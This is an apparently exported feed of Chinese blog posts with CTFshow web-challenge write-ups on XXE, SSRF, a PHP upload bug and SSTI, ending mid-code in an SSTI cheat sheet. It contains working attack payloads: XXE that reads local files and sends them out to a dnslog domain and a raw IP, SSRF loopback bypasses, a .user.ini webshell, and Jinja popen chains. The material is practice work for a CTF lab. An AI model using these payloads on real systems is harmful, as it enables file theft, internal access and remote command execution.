class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里 定义元素为<code>ANY</code>说明接受任何元素，但是定义了一个 xml 的实体（实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;&lt;pass&gt;mypass&lt;&#x2F;pass&gt;&lt;&#x2F;creds&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们使用&amp;xxe对上面定义的xxe实体进行了引用，到时候输出的时候&amp;xxe就会被 “test” 替换。</p>        <h3 id="外部实体"   >          <a href="#外部实体" class="heading-link"><i class="fas fa-link"></i></a><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3>      <p>实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE root-element SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;&#x2F;to&gt;&lt;from&gt;@re&lt;&#x2F;from&gt;&lt;head&gt;v3ry&lt;&#x2F;head&gt;&lt;body&gt;g00d!&lt;&#x2F;body&gt;&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210305225448278.png"></p><p>当然，还有一种引用方式是使用 引用公用 DTD 的方法，语法如下：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）</p>        <h3 id="通用实体"   >          <a href="#通用实体" class="heading-link"><i class="fas fa-link"></i></a><a href="#通用实体" class="headerlink" title="通用实体"></a>通用实体</h3>      <p>用<code>&amp;实体名;</code> 引用的实体，他在DTD 中定义，在 XML 文档中引用</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; &lt;updateProfile&gt;      &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt;      &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt;      ... &lt;&#x2F;updateProfile&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="参数实体"   >          <a href="#参数实体" class="heading-link"><i class="fas fa-link"></i></a><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3>      <p>(1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用<br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; %an-element; %remote-dtd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在了解了基础知识后，下面开始了解xml外部实体注入引发的问题</p><p><strong>373</strong></p><p>最简单的版本咯，带回显直接构造</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xml</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>j1an</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ctfshow</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ctfshow</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>j1an</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>374</strong></p><p>没有回显需要外带了</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE xml [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;&amp;file;.i1ecvd.dnslog.cn&quot;&gt;]&gt;&lt;j1an&gt;&lt;ctfshow&gt;&amp;xxe;&lt;&#x2F;ctfshow&gt;&lt;&#x2F;j1an&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种方法不知道为啥带不出来</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;20.231.29.154&#x2F;1.xml&quot;&gt;%remote;%send;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">#1.xml&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;20.231.29.154&#x2F;1.php?1&#x3D;%file;&#39;&gt;&quot;&gt;&amp;all;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowSSRF</title>
      <link href="/posts/b1fc6cca.html"/>
      <url>/posts/b1fc6cca.html</url>
      
        <content type="html"><![CDATA[        <h2 id="SSRF基础"   >          <a href="#SSRF基础" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF基础" class="headerlink" title="SSRF基础"></a>SSRF基础</h2>      <p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>        <h2 id="相关函数和类"   >          <a href="#相关函数和类" class="heading-link"><i class="fas fa-link"></i></a><a href="#相关函数和类" class="headerlink" title="相关函数和类"></a>相关函数和类</h2>      <p>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中<br>readfile()：输出一个文件的内容<br>fsockopen()：打开一个网络连接或者一个Unix 套接字连接<br>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用<br>fopen()：打开一个文件文件或者 URL<br>PHP原生类SoapClient在触发反序列化时可导致SSRF</p>        <h2 id="相关协议"   >          <a href="#相关协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h2>      <p>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容<br>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等<br>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br>http/s协议：探测内网主机存活</p>        <h2 id="绕过方法"   >          <a href="#绕过方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2>      <ul><li><p><code>http://0.0.0.0/</code></p><p>测试了下这个方法只能在linux下使用，windows并不认识这个IP</p></li><li><p><code>http://foo@127.0.0.1:80@www.google.com/hint.php</code></p><p>此处利用了不同库解析url的差异</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206181201647.JPG"></p><p>不过这个方法在curl较新的版本里被修掉了，buu上的环境也无法使用</p></li><li><p>DNS Rebinding</p><p>用这个，将同一域名绑定在不同的IP下，这样返回DNS请求查询的时候随机返回一个，就导致判断和真正curl发送请求的不是同一个IP</p></li><li><p><code>http://127。0。0。1/hint.php</code></p><p>这个本地倒是测试成功了，buu上就不行，可能跟curl版本有关吧</p></li><li><p><code>http://127.1/hint.php</code></p><p><code>ip2long(&#39;127.1&#39;)</code>会返回<code>false</code>，这里可以绕过</p><p>但是<code>gethostbyname</code>在linux下会把<code>127.1</code>变为<code>127.0.0.1</code>，所以这题是无法使用的</p><p>不过windows下经过<code>gethostbyname</code>后依然是<code>127.1</code>，curl是支持<code>127.1</code>这样的写法的，但这样发出去的http请求是有问题的。因为http包中的host头被设为了<code>127.1</code>，apache会返回一个400 Bad Request</p><p>但是这样构造的gopher请求是可行的</p></li><li><p>进制绕过</p></li><li><p>和127.1类似，也是存在不能用http的问题，但是<code>gethostbyname</code>并不会有影响，可用比如</p><pre class="line-numbers language-none"><code class="language-none">gopher:&#x2F;&#x2F;0177.0.0x0001:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><code>http://127.0.0.1./</code></p><p>curl不支持</p></li></ul><p><strong>351</strong></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phperror_reporting(0);highlight_file(__FILE__);$url&#x3D;$_POST[&#39;url&#39;];$ch&#x3D;curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result&#x3D;curl_exec($ch);curl_close($ch);echo ($result);?&gt;# curl_init — 初始化 cURL 会话    # curl_setopt — 设置一个cURL传输选项# curl_exec — 执行 cURL 会话# curl_close — 关闭 cURL 会话<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">payload:POST:url&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>352</strong></p><p><code>parse_url</code>函数作用是将一个URL拆分，格式如下：</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php$url &#x3D; &#39;http:&#x2F;&#x2F;username:password@hostname&#x2F;path?arg&#x3D;value#anchor&#39;;print_r(parse_url($url));?&gt;以上例程会输出：Array([scheme] &#x3D;&gt; http[host] &#x3D;&gt; hostname[user] &#x3D;&gt; username[pass] &#x3D;&gt; password[path] &#x3D;&gt; &#x2F;path[query] &#x3D;&gt; arg&#x3D;value[fragment] &#x3D;&gt; anchor)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同上即可</p><p><strong>353</strong></p><p>绕过127.0.0.1，可使用进制转换或其他IP</p><pre class="line-numbers language-none"><code class="language-none">进制转换：整数转换过程，将每一位IP转换为二进制并进行拼接2130706433 &#x2F;&#x2F;十进制整数0x7F.0.0.1 &#x2F;&#x2F;十六进制0177.0.0.1 &#x2F;&#x2F;八进制0x7F000001 &#x2F;&#x2F;十六进制整数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">其他IP：127.127.127.12700.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>354</strong></p><p>过滤没了，只能指向其他域名</p><p>1、将自己域名解析为127.0.0.1</p><p>2、将自己网站设置为302重定向到127.0.0.1</p><p><strong>355</strong></p><p>用0或者127.1</p><p>0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0</p><p><strong>356</strong></p><p>更短了只能用0</p><p><strong>357</strong></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">gethostbyname — 返回主机名对应的 IPv4地址# php filter函数filter_var()获取一个变量，并进行过滤filter_var_array()获取多个变量，并进行过滤......# PHP 过滤器FILTER_VALIDATE_IP把值作为 IP 地址来验证，只限 IPv4 或 IPv6 或 不是来自私有或者保留的范围FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于获取到了指向域名的IP值所以域名指向127.0.0.1不再生效，只能使用302重定向或者<strong>DNS rebinding（DNS重新绑定攻击）</strong></p>        <h3 id="DNS-rebinding："   >          <a href="#DNS-rebinding：" class="heading-link"><i class="fas fa-link"></i></a><a href="#DNS-rebinding：" class="headerlink" title="DNS rebinding："></a>DNS rebinding：</h3>      <pre class="line-numbers language-none"><code class="language-none">攻击重点在于DNS服务能够在两次DNS查询中返回不用的IP地址，第一次是真正的IP，第二次是攻击目标IP地址，甚至可以通过这种攻击方法绕过同源策略回到题目，在题目代码中一共对域名进行了两次请求，第一次是 gethostbyname 方法，第二次则是 file_get_contents 文件读取，可以通过 ceye.io 来实现攻击，DNS Rebinding 中设置两个 IP，一个是 127.0.0.1 另一个是随便可以访问的 IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>358</strong></p><p>正则匹配要求URL以<span class="exturl"><a class="exturl__link"   href="http://ctf.开头,以show结尾/" >http://ctf.开头，以show结尾</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>一个完整的URL的格式如下</p><p><code>http://username:password@hostname/path?arg=value#anchor</code></p><p>其中hostname就是我们平常使用的网址，我们只需要让username位置为ctf.，让anchor位置为show即可</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTurl&#x3D;http:&#x2F;&#x2F;ctf.@127.0.0.1&#x2F;flag.php#show<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>359</strong></p><p>随便输入个用户名密码尝试登录</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-01" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 01.12.20.png)</p><p>抓包发现returl参数可能存在SSRF注入点，使用Gopherus生成攻击payload</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-01" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 22.36.11.png)</p><p>写入之后访问即可</p><p><strong>360</strong></p><p>同上</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-01" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 22.44.48.png)</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow记录</title>
      <link href="/posts/82271b5a.html"/>
      <url>/posts/82271b5a.html</url>
      
        <content type="html"><![CDATA[        <h3 id="baby杯——baby-php"   >          <a href="#baby杯——baby-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#baby杯——baby-php" class="headerlink" title="baby杯——baby_php"></a>baby杯——baby_php</h3>      <p>审计代码，明显是文件上传</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class fileUtil&#123;    private $name;    private $content;    public function __construct($name,$content&#x3D;&#39;&#39;)&#123;        $this-&gt;name &#x3D; $name;        $this-&gt;content &#x3D; $content;        ini_set(&#39;open_basedir&#39;, &#39;&#x2F;var&#x2F;www&#x2F;html&#39;);    &#125;    public function file_upload()&#123;        if($this-&gt;waf($this-&gt;name) &amp;&amp; $this-&gt;waf($this-&gt;content))&#123;            return file_put_contents($this-&gt;name, $this-&gt;content);        &#125;else&#123;            return 0;        &#125;    &#125;    private function waf($input)&#123;        return !preg_match(&#39;&#x2F;php&#x2F;i&#39;, $input);    &#125;    public function file_download()&#123;        if(file_exists($this-&gt;name))&#123;            header(&#39;Content-Type: application&#x2F;octet-stream&#39;);            header(&#39;Content-Disposition: attachment; filename&#x3D;&quot;&#39;.$this-&gt;name.&#39;&quot;&#39;);            header(&#39;Content-Transfer-Encoding: binary&#39;);            echo file_get_contents($this-&gt;name);        &#125;else&#123;            return False;        &#125;    &#125;    public function __destruct()&#123;    &#125;&#125;$action &#x3D; $_GET[&#39;a&#39;]?$_GET[&#39;a&#39;]:highlight_file(__FILE__);if($action&#x3D;&#x3D;&#x3D;&#39;upload&#39;)&#123;    die(&#39;Permission denied&#39;);&#125;switch ($action) &#123;    case &#39;upload&#39;:        $name &#x3D; $_POST[&#39;name&#39;];        $content &#x3D; $_POST[&#39;content&#39;];        $ft &#x3D; new fileUtil($name,$content);        if($ft-&gt;file_upload())&#123;            echo $name.&#39; upload success!&#39;;        &#125;        break;    case &#39;download&#39;:        $name &#x3D; $_POST[&#39;name&#39;];        $ft &#x3D; new fileUtil($name,$content);        if($ft-&gt;file_download()&#x3D;&#x3D;&#x3D;False)&#123;            echo $name.&#39; download failed&#39;;        &#125;        break;    default:        echo &#39;baby come on&#39;;        break;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>小知识：$_GET[‘a’]在没有被赋值时默认值时true，case的判定是弱相等</p><p>关键代码</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$action &#x3D; $_GET[&#39;a&#39;]?$_GET[&#39;a&#39;]:highlight_file(__FILE__);if($action&#x3D;&#x3D;&#x3D;&#39;upload&#39;)&#123;&#x2F;&#x2F;a只声明不赋值默认为true，强相等判定无法通过    die(&#39;Permission denied&#39;);&#125;switch ($action) &#123;    case &#39;upload&#39;:&#x2F;&#x2F;true&#x3D;&#x3D;&quot;upload&quot;，判定结果为真，进入upload上传文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看响应头中间件为nginx，上传.user.ini文件来包含，一定要先上传1.txt文件，不然在auto_prepend_file参数生效并且找不到1.txt时整个环境就废了</p><pre class="line-numbers language-none"><code class="language-none">payload:?a&#x3D;POST:content&#x3D;&lt;?&#x3D;&#96;$_GET[&#39;kkk&#39;]&#96;;?&gt;&amp;name&#x3D;1.txtPOST:content&#x3D;auto_prepend_file&#x3D;&quot;1.txt&quot;&amp;name&#x3D;.user.inipayload:?kkk&#x3D;tac &#x2F;flag_baby_here_you_are<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowSSTI</title>
      <link href="/posts/45647.html"/>
      <url>/posts/45647.html</url>
      
        <content type="html"><![CDATA[        <h1 id="SSTI"   >          <a href="#SSTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1>      <p><span class="exturl"><a class="exturl__link"   href="https://cn-sec.com/archives/1322842.html" >https://cn-sec.com/archives/1322842.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="Python中有用的魔术方法"   >          <a href="#Python中有用的魔术方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python中有用的魔术方法" class="headerlink" title="Python中有用的魔术方法"></a><strong>Python中有用的魔术方法</strong></h3>      <pre class="line-numbers language-python" data-language="python"><code class="language-python">__class__           查看对象所在的类__mro__             查看继承关系和调用顺序，返回元组__base__            返回基类__bases__           返回基类元组__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>    返回子类列表__init__            调用初始化函数，可以用来跳到__globals____globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典__builtins__        返回内建内建名称空间字典__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__<span class="token punctuation">(</span><span class="token punctuation">)</span>   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行<span class="token punctuation">.</span>操作的时候（形如<span class="token punctuation">:</span>a<span class="token punctuation">.</span>xxx<span class="token operator">/</span>a<span class="token punctuation">.</span>xxx<span class="token punctuation">(</span><span class="token punctuation">)</span>）都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__<span class="token punctuation">(</span><span class="token punctuation">)</span>        调用字典中的键值，其实就是调用这个魔术方法，比如a<span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span>，就是a<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。<span class="token builtin">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span>            返回描写这个对象的字符串，可以理解成就是打印出来。url_for              flask的一个方法，可以用于得到__builtins__，而且url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>含有current_appget_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>含有current_applipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum<span class="token punctuation">.</span>__globals__含有os模块：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>cycler<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>current_app          应用上下文，一个全局变量request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取<span class="token builtin">open</span>函数<span class="token punctuation">:</span>request<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/proc\self\fd/3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>x1    get传参request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>x1  所有参数request<span class="token punctuation">.</span>cookies      cookies参数request<span class="token punctuation">.</span>headers      请求头参数request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>x1    post传参<span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>applicaation<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded或multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">)</span>request<span class="token punctuation">.</span>data   post传参<span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>a<span class="token operator">/</span>b<span class="token punctuation">)</span>request<span class="token punctuation">.</span>json post传json  <span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>json<span class="token punctuation">)</span>config               当前application的所有配置。此外，也可以这样<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span 